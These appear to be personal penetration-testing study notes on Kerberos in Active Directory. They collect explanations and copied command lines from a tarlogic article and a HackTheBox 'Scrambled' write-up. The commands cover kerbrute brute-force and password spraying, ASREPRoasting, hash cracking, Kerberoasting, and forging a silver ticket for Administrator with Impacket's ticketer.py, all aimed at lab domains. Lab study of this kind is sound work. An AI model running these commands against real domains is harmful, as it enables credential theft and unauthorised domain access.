
A good explanation about how kerberos works:
	https://jumpcloud.com/blog/active-directory-authentication
	https://blog.netwrix.com/2022/08/18/what_is_kerberos/
	
AND AN AMAZING EXPLANATION HERE:
	https://www.youtube.com/watch?v=5N242XcKAsM&list=PLamA-vUTq2V4WQJnz4aOGVqrmq6O2o3b8
	
"The Kerberos Key Distribution Center , or KDC for short, is an integral part of the Kerberos system. The KDC consists of three logical components: a database of all principals and their associated encryption keys, the Authentication Server, and the Ticket Granting Server."
	
"In a Kerberos-based AD authentication, users only log in once to gain access to enterprise resources". ###INSTEAD OF PASSING ON THE LOGIN CREDENTIALS OVER THE NETWORK, AS IS THE CASE WITH LM AND NTLM PROTOCOLS### (here, remember how to get the password hash trying to connect to smb), "the Kerberos system generates a session key for the user. The generated session key lasts for a designated period, providing flexibility to users when it comes to authentication."
__________________________________________________________________________________________________________________________________________________
CREDITS TO THE WEBSITE: https://www.tarlogic.com/blog/how-to-attack-kerberos/

FROM LINUX:

Kerberos brute-force
kerbrute -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt

ASREPRoast
/usr/share/doc/python3-impacket/examples/GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
Cracking the AS_REP:
Hashcat command: root@kali:impacket-examples# hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
John command: root@kali:kali# john --wordlist=passwords_kerb.txt hashes.asreproast

Kerberoasting
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py jurassic.park/triceratops:Sh4rpH0rns -outputfile hashes.kerberoast
need to test: /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request scrm.local/ksimpson -k -no-pass -dc-ip <<IP>>

____________________________________________________________________________________________________________________________________________________

SOURCE: https://harrynorthover.com/articles/scrambled-hackthebox-writeup

Creating A Ticket
    
    Think of a ticket as a cookie for website. Every time you generate a ticket, you will put it in "export KRB5CCNAME=your ticket"
    
    "...Because we cannot access the server using NTLM, we'll have to generate our Ticket Granting Ticket for ksimpson. This means we can then use Kerberos       authentication with other Impacket tools..." (In other words: If I can't logging using NTLM (normal use to enter winrm and smb, por example), but 	k	 kerberos is available, I can try to access the computer using kerberos tickets). So, every access/login, I need to have a ticket (export 					KRB5CCNAME=ksimpson.ccache).
    /usr/share/doc/python3-impacket/examples/getTGT.py scrm.local/ksimpson:ksimpson -dc-ip $i
	
	<<<Do you want to log as John? Need to create a ticket to John. Wanna log after as Mary? Need to creat a ticket to Mary...>>>
	
    "Once we have our ticket, we need to export it so Impacket tools can utilise it"
	export KRB5CCNAME=ksimpson.ccache 
	
	"Now that we can authenticate properly with our TGT, let's try and search for Service Accounts/SPN and see if we get any keys to crack."
	/usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request scrm.local/ksimpson -k -no-pass -dc-ip <<IP>>
	
	"Keeping our new sqlsvc credentials aside, let's continue using our new TGT to access the SMB shares:"
	smbclient.py scrm.local/ksimpson:ksimpson@dc1.scrm.local -dc-ip scrambled.htb -debug -k
	
Going For Silver

	We have credentials for a service account, and we know its full Service Principal Name so now we can make use of Impackets ticketer.py. To do that we need the following
	NTHash - This is the sqlsvc's password converted to an NTLM hash.
	Domain SID - The security identifier of the domain we want to access.
	Domain - scrm.local.
	Service Principal Name - We can get this from the result of running`GetUserSPNs.py' - MSSQLSvc/dc1.scrm.local.
	User Id - 500.
	ticketer.py -nthash B999A16500B87D17EC7F2EXXXXXXXXXX -domain-sid S-1-5-21-2743207045-XXXXXXXXXX-XXXXXXXXXX -domain scrm.local -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator
	
	In case of error using the impateck tool: https://github.com/SecureAuthCorp/impacket/issues/1206
	
______________________________________________________________________________________________________________________________________________


Kerberos brute-force
./kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
./kerbrute bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
Password spraying
./kerbrute passwordspray -d support.htb --dc $ip ../userlist.txt /usr/share/wordlists/rockyou.txt




